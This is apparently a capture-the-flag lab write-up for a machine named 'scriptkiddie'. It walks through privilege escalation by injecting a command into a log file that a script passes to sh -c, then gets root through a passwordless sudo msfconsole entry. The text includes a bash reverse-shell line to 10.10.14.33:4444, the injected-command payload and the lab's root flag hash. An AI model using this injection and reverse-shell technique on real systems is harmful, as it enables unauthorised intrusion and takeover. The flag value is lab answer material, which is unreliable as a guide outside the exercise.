# Lets now enumerate for root

## machine has wget and nc so i thing we will run linpeas
### found nothing on linpeas but finding we found a pwn user and a file owned by pwn
``` bash
ls
kid  pwn
kid@scriptkiddie:/home$ cd pwn/
kid@scriptkiddie:/home/pwn$ ls
recon  scanlosers.sh
kid@scriptkiddie:/home/pwn$ ls -la
total 44
drwxr-xr-x 6 pwn  pwn  4096 Feb  3 12:06 .
drwxr-xr-x 4 root root 4096 Feb  3 07:40 ..
lrwxrwxrwx 1 root root    9 Feb  3 12:06 .bash_history -> /dev/null
-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
drwx------ 2 pwn  pwn  4096 Jan 28 17:08 .cache
drwxrwxr-x 3 pwn  pwn  4096 Jan 28 17:24 .local
-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
-rw-rw-r-- 1 pwn  pwn    74 Jan 28 16:22 .selected_editor
drwx------ 2 pwn  pwn  4096 Feb 10 16:10 .ssh
drwxrw---- 2 pwn  pwn  4096 Jun 15 07:00 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$ 
```

## so this file we can echo with a reverse shell and get the pwn user which has high privilage than kid this file also writes into hacker file so lets get it

``` bash
kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.33/4444 0>&1' #" >>hackers
```

## after running this we have a shell as pwn

``` bash
pwn@scriptkiddie:~$ whoami
whoami
pwn
pwn@scriptkiddie:~$ 
```

## so now lets run sudo -l

``` bash

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

## so we can run metasploit as root lets run it

## running the metasploit with sudo gives us
``` bash
msf6 > id
stty: 'standard input': Inappropriate ioctl for device
[*] exec: id

uid=0(root) gid=0(root) groups=0(root)
```

## so lets grab root flag

``` bash
 cat root.txt
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat root.txt

2caada03235b30ef66a32a774b3a6c4e
```

# so we have root shell hence we pwned the machine
